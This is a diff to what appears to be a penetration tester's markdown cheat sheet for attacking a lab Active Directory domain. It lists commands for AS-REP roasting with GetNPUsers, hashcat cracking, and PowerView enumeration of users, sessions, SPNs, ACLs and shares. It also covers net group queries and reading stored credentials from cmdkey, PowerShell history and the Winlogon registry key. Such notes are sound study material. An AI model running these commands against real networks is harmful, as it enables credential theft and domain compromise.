@@ -45,10 +45,40 @@ GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -ou
 ## hashcat
 hashcat -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 
-
 # LDAP
 ## anon
 ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"
+
+
+# PowerView
+```bash
+Import-Module .\PowerView.ps1
+Get-NetDomain
+Get-NetUser
+Get-NetUser | select cn
+Get-NetUser | select cn,pwdlastset,lastlogon
+Get-NetGroup | select cn
+Get-NetGroup "Sales Department" | select member
+
+Get-NetComputer
+Get-NetComputer | select operatingsystem,dnshostname
+Find-LocalAdminAccess
+Get-NetSession -ComputerName files04 -Verbose
+Get-NetSession -ComputerName web04 -Verbose
+Get-NetSession -ComputerName client74
+Get-NetUser -SPN | select samaccountname,serviceprincipalname(same as setspn -L iis_service)
+Get-ObjectAcl -Identity stephanie
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
+Find-DomainShare
+
+```
+
+# PsLoggedon.exe
+```bash
+.\PsLoggedon.exe \\files04
+
+```
 
 
 # kerbrute
@@ -71,6 +101,11 @@ systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System T
 
 net user /domain
 net user fsmith /domain
+net group /domain
+net group "Sales Department" /domain
+
+
+
 cmdkey /list
 cat (Get-PSReadlineOption).HistorySavePath
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
